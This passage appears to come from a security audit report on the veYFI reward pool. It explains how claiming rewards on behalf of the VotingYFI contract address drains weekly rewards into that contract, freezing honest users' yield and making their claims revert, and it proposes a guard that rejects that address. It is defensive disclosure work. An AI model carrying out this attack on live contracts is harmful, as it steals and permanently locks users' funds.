     - `YFI.approve(REWARD_POOL.address, penalty); REWARD_POOL.burn(penalty)`   

because `withdraw` only ever pays out exactly the user’s locked amount (minus penalty), extra YFI sitting on the contract (from our attack) does not increase anyone’s withdrawal

accounting-wise:

- contract `YFI balance = (sum of user deposits) + (attacker-drained rewards) – (withdrawals + penalties)`
- each withdraw burns exactly `old_locked.amount` from the contract balance
- so after all legit locks are withdrawn, any “extra” YFI (our drained rewards) simply remain stuck in the contract forever

those YFI are no longer:

- in the reward pool (cannot be claimed as veYFI yield)
- mapped to any `locked[user]`
- withdrawable by anyone

> effectively a burn / permanent loss from the perspective of veYFI lockers

## effect on honest users

### loss of current rewards

for all weeks already processed during the attacker’s `claim(VEYFI.address, ...)`:

- `tokens_per_week[week]` has been fully claimed
- veYFI users’ expected rewards for those weeks are now zero, because their share was redirected to `VotingYFI`

### claims start reverting

later, when an honest user tries:

```vyper
claim(user = Alice, relock = False)
```
- `_claim(Alice, last_token_time)` still calculates a positive amount (based on `tokens_per_week` and alice’s veYFI history)
- but the reward pool contract now has insufficient YFI balance (attacker already drained it)
- `YFI.transfer(Alice, amount)` fails, so the whole claim reverts, and:
   - user gets no reward
   - `token_last_balance` stays as previously decreased by attacker’s claim, so accounting doesn’t self-heal
   - so users can neither get their yield nor “reset” the pool state

attacker can repeat the grief whenever new penalties/gauge leftovers refill the pool


# impact is simple:

- theft of unclaimed yield (rewards are redirected away from claimers)
- permanent freezing of that yield (tokens stuck in `VotingYFI`)

# mitigation

### direct fix

on the reward pool side, add a simple guard in the public `claim` / internal `_claim`:

- disallow claiming on behalf of the special global‑supply address:

```vyper
@external
@nonreentrant('lock')
def claim(user: address = msg.sender, relock: bool = False) -> uint256:
    assert user != VEYFI.address  # disallow global-supply pseudo-user
    ...
```

(and optionally also reject `user == empty(address)` if u want)

**rationale:**

- global supply is already used via `ve_supply[t]`
- treating the same address as an ordinary “user” is a design error, not a feature

this is the simplest safe fix that doesn’t require touching the `VotingYFI` contract

### longer‑term hardening (optional)

- avoid storing total supply as `balanceOf(self)` in future ve‑style contracts
   - store global supply in a dedicated variable / mapping key distinct from any possible “user” that can be passed into reward pools
- in all reward-distribution contracts:
   - explicitly restrict claim to:
     - `user == msg.sender`, or
     - `user` in `{msg.sender, some allowlist}` depending on supported delegation model
   - add a sanity check like `require(veSupply[week] > 0)` nd `user != globalSupplyKey`
